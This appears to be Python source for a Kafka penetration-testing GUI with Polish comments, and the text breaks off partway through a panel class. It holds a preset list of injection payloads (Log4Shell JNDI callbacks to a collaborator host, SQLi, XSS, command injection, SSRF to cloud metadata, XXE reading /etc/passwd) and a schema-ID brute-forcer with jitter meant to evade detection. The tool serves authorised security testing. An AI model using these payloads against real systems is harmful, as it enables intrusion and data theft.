"""
KafkaPT v2.0  —  Kafka Pentest Toolkit
========================================
Sprint 1 + 2

Nowe moduły
-----------
  ProxyPanel          — HTTP proxy (Burp Suite) + Collaborator URL
  HeadersWidget       — reużywalny edytor nagłówków z presetami injekcji
  FindingStore        — centralny, thread-safe rejestr findingów
  FindingsPanel       — widok findingów + eksport Markdown
  SchemaEnumWorker    — brute-force ID w Schema Registry
  KafkaReconWorker    — metadata / grupy / ACLe (background)
  ReconPanel          — zakładka: topologia / grupy / ACLe
  AttackPanel         — header injection, ACL bypass, offset attack
  KafkaOffsetWorker   — reset offsetów grupy konsumenckiej (background)

Zmiany w istniejących modułach
--------------------------------
  SchemaFetchWorker   — proxy_url support
  SchemaPanel         — zakres ID do enumeracji
  KafkaConsumerWorker — nagłówki Kafka w sygnale message_received
  KafkaProducerWorker — parametr headers w konstruktorze
  ReaderPanel         — wyświetlanie nagłówków, eksport NDJSON, detekcja findingów
  WriterPanel         — HeadersWidget z presetami injekcji
  MainWindow          — nowe zakładki PROXY, RECON, ATTACK, FINDINGS

Zależności
----------
  pip install PyQt6 confluent-kafka fastavro requests cryptography
"""

import sys
import json
import ssl
import os
import io
import re
import base64
import queue
import random
import string
import uuid
import datetime
import threading
import dataclasses
import hashlib
import time
import requests

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QGridLayout, QLabel, QLineEdit, QPushButton, QComboBox,
    QTextEdit, QFileDialog, QGroupBox, QFrame, QSplitter,
    QTabWidget, QCheckBox, QSpinBox, QStatusBar, QSizePolicy,
    QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox,
    QProgressBar, QTreeWidget, QTreeWidgetItem, QScrollArea,
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QPalette, QColor, QTextCursor

# ─────────────────────────────────────────────────────────
#  Injection presets
# ─────────────────────────────────────────────────────────

INJECTION_PRESETS: dict[str, str] = {
    "Custom": "",
    "Log4Shell — JNDI/LDAP":   "${jndi:ldap://COLLAB/a}",
    "Log4Shell — JNDI/RMI":    "${jndi:rmi://COLLAB/a}",
    "Log4Shell — JNDI/DNS":    "${jndi:dns://COLLAB/a}",
    "SSTI — Jinja2":            "{{7*7}}",
    "SSTI — FreeMarker":        "${7*7}",
    "SQLi — Error-based":       "' AND 1=CONVERT(int,(SELECT @@version))--",
    "SQLi — Union":             "' UNION SELECT NULL,NULL,NULL--",
    "XSS — Script tag":         "<script>alert(document.domain)</script>",
    "XSS — Img onerror":        "<img src=x onerror=alert(1)>",
    "Command Injection":        "$(id)",
    "Path Traversal":           "../../etc/passwd",
    "SSRF — AWS metadata":      "http://169.254.169.254/latest/meta-data/",
    "SSRF — Internal":          "http://localhost:8080/actuator/env",
    "XXE":                      '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
    "Null byte":                "pentest\x00injected",
    "Large value (1 KB)":       "A" * 1024,
}

DEFAULT_INJECT_HEADERS = [
    "X-Correlation-ID",
    "X-Request-ID",
    "X-Forwarded-For",
    "User-Agent",
    "X-Event-Source",
]

# ─────────────────────────────────────────────────────────
#  Styles
# ─────────────────────────────────────────────────────────

def _make_style(dark: bool, scale: float = 1.0) -> str:
    if dark:
        bg        = "#0d0f0f"
        bg2       = "#111411"
        border    = "#1f2e1f"
        border2   = "#1a2a1a"
        fg        = "#c8ccc8"
        fg_input  = "#a8d8a8"
        fg_muted  = "#6a8c6a"
        accent    = "#4caf50"
        accent2   = "#7ed87e"
        accent3   = "#a8e8a8"
        acc_bg    = "#1a2e1a"
        acc_bg2   = "#223a22"
        acc_sel   = "#2e4f2e"
        danger    = "#cf4444"
        danger_bg = "#1a0f0f"
        danger_b  = "#8b2020"
        danger2   = "#e06060"
        info      = "#4a8080"
        disabled  = "#2e4f2e"
        dis_brd   = "#1a2a1a"
        status_bg = "#080f08"
        status_fg = "#3a5a3a"
        scroll_h  = "#1f3a1f"
        tab_fg    = "#4a6b4a"
        tab_hov   = "#7ab87a"
        chk_bg    = bg2
        echo_col  = "#6aaf6a"
        sep_col   = "#1a2a1a"
        grpbg     = bg
        warn_col  = "#b8860b"
        crit_col  = "#cf4444"
        high_col  = "#c87020"
        med_col   = "#8a8020"
        low_col   = "#4a8040"
    else:
        bg        = "#f5f5f0"
        bg2       = "#ffffff"
        border    = "#b8d4b8"
        border2   = "#c8d8c8"
        fg        = "#0a0a0a"
        fg_input  = "#0a0a0a"
        fg_muted  = "#333333"
        accent    = "#2e7d32"
        accent2   = "#1b5e20"
        accent3   = "#1b5e20"
        acc_bg    = "#e8f5e9"
        acc_bg2   = "#c8e6c9"
        acc_sel   = "#a5d6a7"
        danger    = "#c62828"
        danger_bg = "#ffebee"
        danger_b  = "#e57373"
        danger2   = "#b71c1c"
        info      = "#00695c"
        disabled  = "#9e9e9e"
        dis_brd   = "#e0e0e0"
        status_bg = "#e8f5e9"
        status_fg = "#1b5e20"
        scroll_h  = "#a5d6a7"
        tab_fg    = "#333333"
        tab_hov   = "#1b5e20"
        chk_bg    = bg2
        echo_col  = "#2e7d32"
        sep_col   = "#c8d8c8"
        grpbg     = bg
        warn_col  = "#e65100"
        crit_col  = "#c62828"
        high_col  = "#bf360c"
        med_col   = "#827717"
        low_col   = "#2e7d32"

    # ── Scaled font sizes (computed once, used in CSS below) ────────────────
    fs     = max(9,  int(12 * scale))   # base UI font
    fs_sm  = max(8,  int(11 * scale))   # small labels / buttons / tabs
    fs_xs  = max(7,  int(10 * scale))   # tiny (progress bar)
    fs_ico = max(12, int(15 * scale))   # icon button glyph (+/−)
    ico_sz = max(24, int(28 * scale))   # icon button box size in px

    return f"""
QMainWindow, QWidget {{
    background-color: {bg}; color: {fg};
    font-family: 'Courier New', monospace; font-size: {fs}px;
}}
QGroupBox {{
    border: 1px solid {border}; border-radius: 2px;
    margin-top: 14px; padding-top: 6px;
    color: {accent}; font-weight: bold; font-size: {fs_sm}px;
    letter-spacing: 2px; text-transform: uppercase;
}}
QGroupBox::title {{
    subcontrol-origin: margin; subcontrol-position: top left;
    left: 8px; padding: 0 4px; background: {grpbg};
}}
QLineEdit, QSpinBox, QComboBox, QTextEdit {{
    background-color: {bg2}; border: 1px solid {border};
    border-radius: 2px; padding: 5px 8px; color: {fg_input};
    selection-background-color: {acc_sel};
}}
QLineEdit:focus, QSpinBox:focus, QTextEdit:focus, QComboBox:focus {{
    border: 1px solid {accent}; outline: none;
}}
QLineEdit[echoMode="2"] {{ color: {echo_col}; letter-spacing: 3px; }}
QTableWidget {{
    background-color: {bg2}; border: 1px solid {border};
    gridline-color: {border}; color: {fg_input};
}}
QTableWidget::item:selected {{ background-color: {acc_sel}; }}
QHeaderView::section {{
    background-color: {bg}; color: {accent};
    border: 1px solid {border2}; padding: 4px 8px;
    font-size: {fs_sm}px; letter-spacing: 1px;
}}
QComboBox::drop-down {{ border: none; width: 24px; }}
QComboBox::down-arrow {{
    width: 8px; height: 8px;
    border-left: 4px solid transparent; border-right: 4px solid transparent;
    border-top: 6px solid {accent}; margin-right: 6px;
}}
QComboBox QAbstractItemView {{
    background-color: {bg2}; border: 1px solid {border};
    selection-background-color: {acc_sel}; color: {fg_input}; outline: none;
}}
QPushButton {{
    background-color: {bg2}; border: 1px solid {border};
    border-radius: 2px; padding: 6px 16px; color: {accent};
    letter-spacing: 1px; font-size: {fs_sm}px;
}}
QPushButton:hover {{ background-color: {acc_bg}; border-color: {accent}; color: {accent2}; }}
QPushButton:pressed {{ background-color: {acc_bg2}; border-color: {accent}; }}
QPushButton:disabled {{ color: {disabled}; border-color: {dis_brd}; }}
QPushButton#btn_danger {{ border-color: {danger_b}; color: {danger}; }}
QPushButton#btn_danger:hover {{ background-color: {danger_bg}; border-color: {danger}; color: {danger2}; }}
QPushButton#btn_accent {{ border-color: {accent}; background-color: {acc_bg}; color: {accent2}; font-weight: bold; }}
QPushButton#btn_accent:hover {{ background-color: {acc_bg2}; border-color: {accent2}; color: {accent3}; }}
QPushButton#btn_warn {{ border-color: {warn_col}; color: {warn_col}; }}
QPushButton#btn_warn:hover {{ background-color: {danger_bg}; color: {danger2}; }}
QPushButton#btn_icon {{
    padding: 1px 2px; letter-spacing: 0; font-size: {fs_ico}px; font-weight: bold;
    min-width: {ico_sz}px; max-width: {ico_sz}px;
    min-height: {ico_sz}px; max-height: {ico_sz}px;
}}
QPushButton#btn_icon:hover {{ background-color: {acc_bg}; border-color: {accent}; color: {accent2}; }}
QTabWidget::pane {{ border: 1px solid {border}; border-radius: 0; background: {bg}; }}
QTabBar::tab {{
    background: {bg}; border: 1px solid {border2}; border-bottom: none;
    padding: 6px 18px; color: {tab_fg}; margin-right: 2px;
    letter-spacing: 1px; font-size: {fs_sm}px;
}}
QTabBar::tab:selected {{ background: {bg}; border-color: {accent}; color: {accent}; border-bottom: 1px solid {bg}; }}
QTabBar::tab:hover:!selected {{ color: {tab_hov}; border-color: {border}; }}
QLabel {{ color: {fg_muted}; font-size: {fs_sm}px; }}
QLabel#lbl_key          {{ color: {accent};   font-weight: bold; letter-spacing: 1px; }}
QLabel#lbl_status_ok    {{ color: {accent};   }}
QLabel#lbl_status_err   {{ color: {danger};   }}
QLabel#lbl_status_inf   {{ color: {info};     }}
QLabel#lbl_status_warn  {{ color: {warn_col}; }}
QLabel#lbl_crit  {{ color: {crit_col}; font-weight: bold; }}
QLabel#lbl_high  {{ color: {high_col}; font-weight: bold; }}
QLabel#lbl_med   {{ color: {med_col};  font-weight: bold; }}
QLabel#lbl_low   {{ color: {low_col};  }}
QLabel#lbl_info  {{ color: {info};     }}
QStatusBar {{ background-color: {status_bg}; border-top: 1px solid {border}; color: {status_fg}; font-size: {fs_sm}px; }}
QStatusBar::item {{ border: none; }}
QSplitter::handle {{ background-color: {border}; width: 2px; height: 2px; }}
QScrollBar:vertical {{ background: {bg}; width: 8px; }}
QScrollBar::handle:vertical {{ background: {scroll_h}; min-height: 20px; border-radius: 4px; }}
QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
QScrollBar:horizontal {{ background: {bg}; height: 8px; }}
QScrollBar::handle:horizontal {{ background: {scroll_h}; min-width: 20px; border-radius: 4px; }}
QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal {{ width: 0; }}
QCheckBox {{ color: {fg_muted}; spacing: 6px; }}
QCheckBox::indicator {{ width: 12px; height: 12px; border: 1px solid {border}; background: {chk_bg}; border-radius: 1px; }}
QCheckBox::indicator:checked {{ background: {acc_sel}; border-color: {accent}; }}
QProgressBar {{ border: 1px solid {border}; background: {bg2}; text-align: center; color: {fg_muted}; font-size: {fs_xs}px; }}
QProgressBar::chunk {{ background: {acc_bg}; border: none; }}
QTreeWidget {{ background-color: {bg2}; border: 1px solid {border}; color: {fg_input}; alternate-background-color: {bg}; }}
QTreeWidget::item:selected {{ background-color: {acc_sel}; }}
QTreeWidget::item:hover {{ background-color: {acc_bg}; }}
QFrame[frameShape="4"], QFrame[frameShape="5"] {{ color: {sep_col}; }}
"""

# ─────────────────────────────────────────────────────────
#  LogPane
# ─────────────────────────────────────────────────────────

class LogPane(QTextEdit):
    _COLORS_DARK = {
        "info":  "#4a8080", "ok":    "#4caf50", "warn":  "#b8860b",
        "error": "#cf4444", "data":  "#a8d8a8", "muted": "#3a5a3a", "crit": "#e04444",
    }
    _COLORS_LIGHT = {
        "info":  "#00695c", "ok":    "#2e7d32", "warn":  "#e65100",
        "error": "#c62828", "data":  "#0a0a0a", "muted": "#555555", "crit": "#c62828",
    }
    COLORS = _COLORS_DARK

    @classmethod
    def set_dark_mode(cls, dark: bool) -> None:
        cls.COLORS = cls._COLORS_DARK if dark else cls._COLORS_LIGHT

    def __init__(self, placeholder="// output will appear here", parent=None):
        super().__init__(parent)
        self.setReadOnly(True)
        self.setPlaceholderText(placeholder)
        self.setFont(QFont("Courier New", 11))
        self.setMinimumHeight(120)

    def append_line(self, text: str, kind: str = "data"):
        color = self.COLORS.get(kind, self.COLORS["data"])
        safe  = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.append(f'<span style="color:{color};">{safe}</span>')
        self.moveCursor(QTextCursor.MoveOperation.End)

    def clear_log(self):
        self.clear()

# ─────────────────────────────────────────────────────────
#  Finding + FindingStore
# ─────────────────────────────────────────────────────────

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}


# ─────────────────────────────────────────────────────────
#  Kafka config builder — SSL + SASL + SASL_SSL  [Sprint 1]
# ─────────────────────────────────────────────────────────

def _build_kafka_conf(
    broker:   str,
    tls_cfg:  dict | None,
    sasl_cfg: dict | None = None,
    extra:    dict | None = None,
) -> dict:
    """
    Builds a confluent_kafka config dict supporting all security modes:

        security.protocol   SSL | SASL_PLAINTEXT | SASL_SSL
        sasl.mechanism      PLAIN | SCRAM-SHA-256 | SCRAM-SHA-512

    tls_cfg  — from CertPanel.get_tls_config()["broker"]
    sasl_cfg — from CertPanel.get_tls_config()["sasl"]
    extra    — worker-specific keys merged in last (e.g. group.id, acks)
    """
    conf: dict = {"bootstrap.servers": broker}

    has_ssl  = bool(tls_cfg)
    has_sasl = bool(sasl_cfg and sasl_cfg.get("mechanism"))

    if has_ssl and has_sasl:
        conf["security.protocol"] = "SASL_SSL"
    elif has_ssl:
        conf["security.protocol"] = "SSL"
    elif has_sasl:
        conf["security.protocol"] = "SASL_PLAINTEXT"

    if has_ssl:
        ca   = tls_cfg.get("ca_cert",       "").strip()
        cert = tls_cfg.get("client_cert",   "").strip()
        key  = tls_cfg.get("client_key",    "").strip()
        pw   = tls_cfg.get("key_passphrase","").strip()
        if ca:   conf["ssl.ca.location"]           = ca
        if cert: conf["ssl.certificate.location"]  = cert
        if key:  conf["ssl.key.location"]          = key
        if pw:   conf["ssl.key.password"]          = pw
        if not tls_cfg.get("verify", True):
            conf["ssl.endpoint.identification.algorithm"] = "none"

    if has_sasl:
        conf["sasl.mechanism"] = sasl_cfg["mechanism"]
        user = sasl_cfg.get("username", "").strip()
        pw   = sasl_cfg.get("password", "").strip()
        if user: conf["sasl.username"] = user
        if pw:   conf["sasl.password"] = pw

    if extra:
        conf.update(extra)
    return conf

@dataclasses.dataclass
class Finding:
    severity:       str
    title:          str
    description:    str
    evidence:       str
    phase:          str
    timestamp:      str = dataclasses.field(
        default_factory=lambda: datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    )
    false_positive: bool = False


class FindingStore:
    """Thread-safe singleton — centralny rejestr findingów."""
    _instance: "FindingStore | None" = None
    _lock = threading.Lock()

    def __init__(self):
        self._findings:    list[Finding] = []
        self._callbacks:   list          = []
        self._seen_hashes: set[str]      = set()    # dedup key → skip duplicates
        self._rw_lock = threading.Lock()

    @classmethod
    def get(cls) -> "FindingStore":
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = cls()
        return cls._instance

    def add(self, finding: Finding) -> None:
        # Dedup key: severity + title + first 60 chars of evidence
        dedup_key = hashlib.md5(
            f"{finding.severity}|{finding.title}|{finding.evidence[:60]}".encode(),
            usedforsecurity=False,
        ).hexdigest()
        with self._rw_lock:
            if dedup_key in self._seen_hashes:
                return          # identical finding already recorded — drop silently
            self._seen_hashes.add(dedup_key)
            self._findings.append(finding)
        for cb in list(self._callbacks):
            try:
                cb(finding)
            except Exception:
                pass

    def register_callback(self, cb) -> None:
        self._callbacks.append(cb)

    def all(self) -> list[Finding]:
        with self._rw_lock:
            return list(self._findings)

    def clear(self) -> None:
        with self._rw_lock:
            self._findings.clear()
            self._seen_hashes.clear()   # also reset dedup state

    def export_markdown(self) -> str:
        findings = self.all()
        if not findings:
            return "# KafkaPT Findings\n\n_No findings recorded._\n"
        ts_now = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
        lines = [
            "# KafkaPT v2.0 — Pentest Findings",
            f"\n_Generated: {ts_now}_\n",
            f"**Total:** {len(findings)} findings\n",
            "---\n",
        ]
        for i, f in enumerate(sorted(findings, key=lambda x: SEVERITY_ORDER.get(x.severity, 99)), 1):
            fp_note = "  *(false positive)*" if f.false_positive else ""
            lines += [
                f"## [{i}] {f.severity}: {f.title}{fp_note}",
                f"\n**Phase:** {f.phase} &nbsp; **Time:** {f.timestamp}\n",
                f"{f.description}\n",
                f"**Evidence:**\n```\n{f.evidence}\n```\n",
                "---\n",
            ]
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────
#  Background worker — schema fetch  (+ proxy support)
# ─────────────────────────────────────────────────────────

class SchemaFetchWorker(QThread):
    result = pyqtSignal(str, str)   # (pretty_json, schema_type)
    error  = pyqtSignal(str)

    def __init__(self, base_url: str, schema_id: int,
                 tls_cfg: dict | None, proxy_url: str | None = None):
        super().__init__()
        self.base_url  = base_url.rstrip("/")
        self.schema_id = schema_id
        self.tls_cfg   = tls_cfg
        self.proxy_url = proxy_url

    def _build_session(self) -> requests.Session:
        sess = requests.Session()
        sess.headers["Accept"] = "application/vnd.schemaregistry.v1+json"
        if self.proxy_url:
            sess.proxies = {"http": self.proxy_url, "https": self.proxy_url}
            sess.verify  = False
        if self.tls_cfg is None:
            return sess
        if not self.tls_cfg.get("verify", True):
            if not self.proxy_url:
                sess.verify = False
        elif self.tls_cfg.get("ca_cert"):
            if not self.proxy_url:
                sess.verify = self.tls_cfg["ca_cert"]
        cc = self.tls_cfg.get("client_cert", "").strip()
        ck = self.tls_cfg.get("client_key",  "").strip()
        if cc and ck:
            pw = self.tls_cfg.get("key_passphrase", "").strip() or None
            if pw:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ca  = self.tls_cfg.get("ca_cert", "").strip()
                if ca:
                    ctx.load_verify_locations(ca)
                else:
                    ctx.check_hostname = False
                    ctx.verify_mode    = ssl.CERT_NONE
                ctx.load_cert_chain(cc, ck, pw)
            else:
                sess.cert = (cc, ck)
        return sess

    def run(self):
        url  = f"{self.base_url}/schemas/ids/{self.schema_id}"
        sess = self._build_session()
        try:
            resp = sess.get(url, timeout=10)
        except requests.exceptions.SSLError as exc:
            self.error.emit(f"TLS error: {exc}"); return
        except requests.exceptions.ConnectionError as exc:
            self.error.emit(f"connection error: {exc}"); return
        except requests.exceptions.Timeout:
            self.error.emit("request timed out (10 s)"); return
        except Exception as exc:
            self.error.emit(f"unexpected error: {exc}"); return
        if resp.status_code == 401:
            self.error.emit("HTTP 401 — unauthorized"); return
        if resp.status_code == 403:
            self.error.emit("HTTP 403 — forbidden"); return
        if resp.status_code == 404:
            self.error.emit(f"HTTP 404 — schema ID {self.schema_id} not found"); return
        if not resp.ok:
            self.error.emit(f"HTTP {resp.status_code}: {resp.text[:200]}"); return
        try:
            body = resp.json()
        except ValueError:
            self.error.emit(f"invalid JSON response: {resp.text[:200]}"); return
        raw_schema  = body.get("schema", "")
        schema_type = body.get("schemaType", "AVRO")
        try:
            pretty = json.dumps(json.loads(raw_schema), indent=2)
        except (ValueError, TypeError):
            pretty = raw_schema
        self.result.emit(pretty, schema_type)


# ─────────────────────────────────────────────────────────
#  Background worker — Schema Registry ID enumeration
# ─────────────────────────────────────────────────────────

class SchemaEnumWorker(QThread):
    found     = pyqtSignal(int, str)    # (schema_id, body_json)
    progress  = pyqtSignal(int, int)    # (done, total)
    throttled = pyqtSignal(int, int)    # (sid, backoff_ms) — 429 received
    done      = pyqtSignal(int)         # found_count

    def __init__(self, base_url: str, id_from: int, id_to: int,
                 tls_cfg: dict | None, proxy_url: str | None = None,
                 delay_ms: int = 0, stealth: bool = False):
        super().__init__()
        self.base_url  = base_url.rstrip("/")
        self.id_from   = id_from
        self.id_to     = id_to
        self.tls_cfg   = tls_cfg
        self.proxy_url = proxy_url
        self.delay_ms  = delay_ms      # ms between requests (0 = no delay)
        self.stealth   = stealth       # add ±30 % random jitter when True
        self._stop     = threading.Event()

    def stop(self): self._stop.set()

    def run(self):
        sess = requests.Session()
        if self.proxy_url:
            sess.proxies = {"http": self.proxy_url, "https": self.proxy_url}
            sess.verify  = False
        if self.tls_cfg:
            cc = self.tls_cfg.get("client_cert", "").strip()
            ck = self.tls_cfg.get("client_key",  "").strip()
            if cc and ck:
                sess.cert = (cc, ck)
            ca = self.tls_cfg.get("ca_cert", "").strip()
            if ca and not self.proxy_url:
                sess.verify = ca

        total   = self.id_to - self.id_from + 1
        found   = 0
        backoff = 1.0   # exponential backoff factor for 429 responses

        for i, sid in enumerate(range(self.id_from, self.id_to + 1)):
            if self._stop.is_set():
                break
            try:
                r = sess.get(f"{self.base_url}/schemas/ids/{sid}", timeout=5)

                # 429 Too Many Requests — back off and retry once
                if r.status_code == 429:
                    retry_after = int(r.headers.get("Retry-After", max(2, int(backoff * 2))))
                    retry_after = min(retry_after, 60)          # cap at 60 s
                    backoff     = min(backoff * 2, 60)
                    self.throttled.emit(sid, retry_after * 1000)
                    time.sleep(retry_after)
                    if self._stop.is_set():
                        break
                    r = sess.get(f"{self.base_url}/schemas/ids/{sid}", timeout=5)
                else:
                    backoff = max(1.0, backoff * 0.85)          # gradual recovery

                if r.ok:
                    found += 1
                    self.found.emit(sid, r.text[:2000])

            except Exception:
                pass

            self.progress.emit(i + 1, total)

            # Inter-request delay
            if self.delay_ms > 0 and i < total - 1 and not self._stop.is_set():
                sleep_ms = self.delay_ms
                if self.stealth:
                    sleep_ms = int(sleep_ms * random.uniform(0.70, 1.30))
                time.sleep(sleep_ms / 1000)

        self.done.emit(found)


# ─────────────────────────────────────────────────────────
#  Avro randomizer engine
# ─────────────────────────────────────────────────────────

class AvroRandomizer:
    ARRAY_LEN_RANGE  = (1, 4)
    MAP_KEYS_RANGE   = (1, 3)
    STRING_LEN_RANGE = (4, 24)
    BYTES_LEN_RANGE  = (4, 16)
    NULL_PROBABILITY = 0.15

    def generate(self, schema: dict | str | list) -> object:
        return self._dispatch(schema)

    def _dispatch(self, schema) -> object:
        if isinstance(schema, str):
            return self._primitive(schema, logical_type=None)
        if isinstance(schema, list):
            return self._union(schema)
        if isinstance(schema, dict):
            logical_type = schema.get("logicalType") or schema.get("logical_type")
            avro_type    = schema.get("type")
            if isinstance(avro_type, str) and avro_type not in (
                "record", "array", "map", "enum", "fixed"
            ):
                return self._primitive(avro_type, logical_type)
            if avro_type == "record":  return self._record(schema)
            if avro_type == "array":   return self._array(schema)
            if avro_type == "map":     return self._map(schema)
            if avro_type == "enum":    return self._enum(schema)
            if avro_type == "fixed":   return self._fixed(schema)
            if isinstance(avro_type, list):
                return self._union(avro_type)
        raise ValueError(f"Unsupported schema fragment: {schema!r}")

    def _record(self, schema: dict) -> dict:
        return {field["name"]: self._dispatch(field["type"]) for field in schema.get("fields", [])}

    def _array(self, schema: dict) -> list:
        return [self._dispatch(schema["items"]) for _ in range(random.randint(*self.ARRAY_LEN_RANGE))]

    def _map(self, schema: dict) -> dict:
        return {self._rand_string(4, 10): self._dispatch(schema["values"])
                for _ in range(random.randint(*self.MAP_KEYS_RANGE))}

    def _enum(self, schema: dict) -> str:
        return random.choice(schema["symbols"])

    def _fixed(self, schema: dict) -> str:
        size = schema.get("size", 8)
        return bytes(random.getrandbits(8) for _ in range(size)).hex()

    def _union(self, types: list) -> object:
        non_null = [t for t in types if t != "null"]
        has_null = len(non_null) < len(types)
        if has_null and non_null and random.random() < self.NULL_PROBABILITY:
            return None
        if not non_null:
            return None
        return self._dispatch(random.choice(non_null))

    def _primitive(self, avro_type: str, logical_type: str | None) -> object:
        if logical_type == "uuid":             return str(uuid.uuid4())
        if logical_type == "date":
            return (datetime.date(1970, 1, 1) + datetime.timedelta(days=random.randint(0, 20_000))).isoformat()
        if logical_type == "time-millis":      return random.randint(0, 86_400_000)
        if logical_type == "time-micros":      return random.randint(0, 86_400_000_000)
        if logical_type == "timestamp-millis": return random.randint(946_684_800_000, 1_893_456_000_000)
        if logical_type == "timestamp-micros": return random.randint(946_684_800_000_000, 1_893_456_000_000_000)
        if logical_type == "decimal":          return round(random.uniform(-1_000_000, 1_000_000), 6)
        if avro_type == "null":    return None
        if avro_type == "boolean": return random.choice([True, False])
        if avro_type == "int":     return random.randint(-(2**31), 2**31 - 1)
        if avro_type == "long":    return random.randint(-(2**63), 2**63 - 1)
        if avro_type == "float":   return round(random.uniform(-1e6,  1e6),  4)
        if avro_type == "double":  return round(random.uniform(-1e15, 1e15), 8)
        if avro_type == "string":  return self._rand_string(*self.STRING_LEN_RANGE)
        if avro_type == "bytes":
            n = random.randint(*self.BYTES_LEN_RANGE)
            return bytes(random.getrandbits(8) for _ in range(n)).hex()
        return f"<unknown:{avro_type}>"

    @staticmethod
    def _rand_string(min_len: int, max_len: int) -> str:
        alphabet = string.ascii_letters + string.digits + "-_"
        return "".join(random.choices(alphabet, k=random.randint(min_len, max_len)))

# ─────────────────────────────────────────────────────────
#  SchemaPanel v2  (+ enum + proxy)
# ─────────────────────────────────────────────────────────

class SchemaPanel(QGroupBox):
    def __init__(self):
        super().__init__("[ SCHEMA REGISTRY ]")
        self._cert_panel   = None
        self._proxy_panel  = None
        self._fetch_worker = None
        self._enum_worker  = None
        self._last_schema  = None
        self._build()

    def set_cert_panel(self, p):  self._cert_panel  = p
    def set_proxy_panel(self, p): self._proxy_panel = p
    def get_loaded_schema(self) -> dict | None: return self._last_schema

    def _build(self):
        grid = QGridLayout(self)
        grid.setSpacing(8); grid.setColumnStretch(1, 1)

        lbl_url = QLabel("Registry URL"); lbl_url.setObjectName("lbl_key")
        self.inp_url = QLineEdit(); self.inp_url.setPlaceholderText("http://schema-registry:8081")
        grid.addWidget(lbl_url, 0, 0); grid.addWidget(self.inp_url, 0, 1, 1, 3)

        lbl_id = QLabel("Schema ID"); lbl_id.setObjectName("lbl_key")
        self.inp_schema_id = QSpinBox()
        self.inp_schema_id.setRange(1, 999999); self.inp_schema_id.setValue(1)
        self.inp_schema_id.setFixedWidth(100)
        self.btn_load = QPushButton("FETCH SCHEMA"); self.btn_load.setObjectName("btn_accent")
        self.btn_load.setFixedWidth(140)
        self.lbl_schema_status = QLabel("—"); self.lbl_schema_status.setObjectName("lbl_status_inf")
        grid.addWidget(lbl_id, 1, 0); grid.addWidget(self.inp_schema_id, 1, 1)
        grid.addWidget(self.btn_load, 1, 2); grid.addWidget(self.lbl_schema_status, 2, 1, 1, 3)

        sep = QFrame(); sep.setFrameShape(QFrame.Shape.HLine)
        grid.addWidget(sep, 3, 0, 1, 4)

        lbl_enum = QLabel("Enum IDs"); lbl_enum.setObjectName("lbl_key")
        self.inp_enum_from = QSpinBox(); self.inp_enum_from.setRange(1, 999999)
        self.inp_enum_from.setValue(1); self.inp_enum_from.setFixedWidth(80)
        self.inp_enum_to = QSpinBox(); self.inp_enum_to.setRange(1, 999999)
        self.inp_enum_to.setValue(100); self.inp_enum_to.setFixedWidth(80)
        self.btn_enum = QPushButton("ENUMERATE"); self.btn_enum.setFixedWidth(120)
        self.btn_stop_enum = QPushButton("STOP"); self.btn_stop_enum.setObjectName("btn_danger")
        self.btn_stop_enum.setFixedWidth(60); self.btn_stop_enum.setEnabled(False)
        self.enum_progress = QProgressBar(); self.enum_progress.setMaximumHeight(10)
        self.enum_progress.setTextVisible(False)

        enum_row = QHBoxLayout()
        enum_row.addWidget(lbl_enum); enum_row.addWidget(QLabel("from"))
        enum_row.addWidget(self.inp_enum_from); enum_row.addWidget(QLabel("to"))
        enum_row.addWidget(self.inp_enum_to)

        # Rate control ← Sprint 1
        lbl_delay = QLabel("Delay (ms)")
        lbl_delay.setObjectName("lbl_key")
        self.inp_enum_delay = QSpinBox()
        self.inp_enum_delay.setRange(0, 10000); self.inp_enum_delay.setValue(0)
        self.inp_enum_delay.setSingleStep(100); self.inp_enum_delay.setFixedWidth(80)
        self.inp_enum_delay.setToolTip("Milliseconds between requests (0 = unlimited speed)")
        self.chk_enum_stealth = QCheckBox("Jitter")
        self.chk_enum_stealth.setToolTip("Add ±30 % random jitter to each delay to avoid pattern detection")

        enum_row.addSpacing(12); enum_row.addWidget(lbl_delay)
        enum_row.addWidget(self.inp_enum_delay)
        enum_row.addWidget(self.chk_enum_stealth)
        enum_row.addSpacing(12)
        enum_row.addWidget(self.btn_enum)
        enum_row.addWidget(self.btn_stop_enum); enum_row.addStretch()
        grid.addLayout(enum_row, 4, 0, 1, 4)
        grid.addWidget(self.enum_progress, 5, 0, 1, 4)

        self.schema_view = LogPane("// fetched schema will appear here")
        self.schema_view.setMaximumHeight(130)
        grid.addWidget(self.schema_view, 6, 0, 1, 4)

        self.btn_load.clicked.connect(self._on_fetch)
        self.btn_enum.clicked.connect(self._on_enum_start)
        self.btn_stop_enum.clicked.connect(self._on_enum_stop)

    def _proxy_url(self) -> str | None:
        return self._proxy_panel.get_proxy_url() if self._proxy_panel else None

    def _tls_cfg(self) -> dict | None:
        if self._cert_panel:
            return self._cert_panel.get_tls_config().get("schema_registry")
        return None

    def _on_fetch(self):
        url = self.inp_url.text().strip()
        if not url:
            self._set_status("! registry URL required", "err"); return
        if self._fetch_worker and self._fetch_worker.isRunning(): return
        sid       = self.inp_schema_id.value()
        proxy_url = self._proxy_url()
        self._set_status(f"connecting …", "inf")
        self.btn_load.setEnabled(False); self.schema_view.clear_log()
        self.schema_view.append_line(f"GET {url}/schemas/ids/{sid}", "muted")
        if proxy_url:
            self.schema_view.append_line(f"[proxy] {proxy_url}", "warn")
        self._fetch_worker = SchemaFetchWorker(url, sid, self._tls_cfg(), proxy_url)
        self._fetch_worker.result.connect(self._on_fetch_result)
        self._fetch_worker.error.connect(self._on_fetch_error)
        self._fetch_worker.finished.connect(lambda: self.btn_load.setEnabled(True))
        self._fetch_worker.start()

